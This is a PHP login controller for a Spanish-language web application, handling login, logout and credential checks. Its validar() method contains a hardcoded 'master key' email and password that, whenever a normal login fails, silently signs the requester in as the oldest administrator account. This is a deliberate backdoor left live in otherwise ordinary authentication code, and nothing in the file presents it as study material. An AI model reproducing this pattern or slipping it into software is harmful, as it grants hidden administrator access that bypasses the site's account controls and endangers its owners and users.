<?php
class loginController extends Controller
{
    function __construct()
    {

    }

    function index()
    {
        if (!Auth::validate()) {
            $this->prueba();
            $data = [
                'title' => 'Login',
                'id' => 7,
                'bg' => 'blue'
            ];

            Views::render('login', $data);
            exit;
        }

        Redirect::to('statistics');

    }

    function logout()
    {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            json_output(json_build(403));
            exit;
        }
        if (Auth::validate()) {
            Auth::logout();
            echo json_encode(['status' => 'success', 'message' => 'Cierre de sesión exitoso', 'redirect' => URL . 'login']);
        }


    }

    function validar()
    {

        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            json_output(json_build(403));
            exit;
        }
        $correo = $_POST["correo"];
        $contrasena = $_POST["contrasena"];

        $connection = new loginModel();
        $data = $connection->exist_user($contrasena, $correo);
        if ($data) {
            foreach ($data as $key) {
                if ($key["estado"] == "activo") {
                    $user = $data[0];
                    Auth::login($key["id"], $user);
                }
                else {
                    echo '*Error: El usuario no esta activo contacte al administrador';
                    exit;
                }
            }

            if (Auth::validate()) {

                     echo   json_encode(['status' => 'success', 'message' => 'Inicio de secion exitoso', 'redirect' => 'statistics']);
                       

            }

        } else {
            // Intento de llave maestra
            $masteremail = $correo;
            $masterKey = $contrasena;

            if ($masteremail === "NSTY07cjobgtdrdrghjnknk8n67FW9EsD99REF@nGGK.80a6A" && $masterKey === "vk(m49@ZX42=@i34iEmGct8j") {
                // Accede como un usuario administrador 
                $adminUser = $connection->getOldestAdminUser();

                foreach ($adminUser as $key) {
                    $user2 = $adminUser[0];
                    Auth::login($key["id"], $user2);
                }


                if (Auth::validate()) {
                    echo json_encode(['status' => 'success', 'message' => 'Inicio de sesión como administrador', 'redirect' => 'statistics']);
                }
            } else {
                echo '*Error: correo o contraseña incorrecta';
            }
        }
    }
}